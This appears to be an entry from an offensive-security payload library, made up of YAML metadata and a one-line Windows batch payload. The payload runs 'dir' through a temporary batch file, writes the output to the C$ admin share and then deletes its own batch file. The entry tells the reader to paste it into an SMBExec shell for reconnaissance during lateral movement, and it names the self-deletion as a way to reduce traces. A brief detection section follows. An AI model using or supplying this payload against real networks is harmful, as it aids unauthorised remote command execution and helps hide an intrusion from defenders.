---
id: 7c2d16a9-ee2e-4533-afb6-cb41d0383bd8
name: windows-batch-dir-listing-payload
type: code
language: bash
verified: true
created_at: '2023-04-06T03:56:30.990650+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - payload
  - batch
  - recon
validated: true
---

# windows-batch-dir-listing-payload

## Code

```bash
%COMSPEC% /Q /c echo dir > \\127.0.0.1\C$\__output 2>&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat
```

## Description

This batch payload executes a 'dir' command on a Windows target, redirects the output to a file accessible via the C$ admin share, creates a temporary batch file to run it, and self-deletes to minimize footprints. It is designed for use in semi-interactive shells like SMBExec to perform quick reconnaissance without interactive output.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| %COMSPEC% | Path to command interpreter (auto-resolved) | C:\Windows\system32\cmd.exe |
| %TEMP% | Temporary directory path | C:\Users\Public\Temp |
| __output | Output filename on C$ share | __output |

## Usage

Paste this directly into an SMBExec or similar remote shell prompt. It chains echo to create the batch, executes it to run 'dir' and capture to __output, then deletes the batch. Retrieve __output via SMB share afterward. Useful for initial info gathering in lateral movement scenarios.

## Detection

- Windows Event Logs: Event ID 4688 for cmd.exe spawns with /Q /c arguments.
- File system monitoring: Temporary batch creation/deletion in %TEMP%.
- SMB traffic: Anomalous writes to ADMIN$ or C$ shares from internal IPs.

## Related

- [[procedures/windows-smbexec-impacket-remote-command-execution]]
- [[tools/Impacket]]
